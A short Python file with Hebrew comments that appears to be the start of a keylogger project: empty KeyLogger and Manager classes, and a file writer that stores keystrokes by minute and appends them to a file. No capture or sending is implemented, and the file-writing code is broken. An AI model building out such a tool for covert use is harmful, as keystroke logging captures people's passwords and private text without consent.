from abc import ABC,abstractmethod
from datetime import datetime

class KeyLogger:
    pass

#  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
class Writer(ABC):
    @abstractmethod
    def write(key: str):
        pass
    @abstractmethod
    def send(buffer):
        pass

# .מחלקת כתיבה לקובץ. מקבלת נתיב של הקובץ
# .מתודת כתוב: כותבת הקשות מקלדת למילון ששומר דקות וטקסט 
# מתודת שלח: שולחת את המילון לקובץ.
class FileWriter(Writer):
    def __init__(self, file_path):
        self.text_dict = {}
        self.cur_min = datetime.now().strftime('%Y-%m-%d %H:%M')
        self.file_path = file_path
    def write(self, key: str):
        if self.cur_min not in self.text_dict:
            self.text_dict[self.cur_min] = key
        else:
            self.text_dict[self.cur_min] += key
    def send(self, buffer):
        with open(self.file_path, "a") as file:
            file.write(self.text_dict)
        
class Manager:
    pass
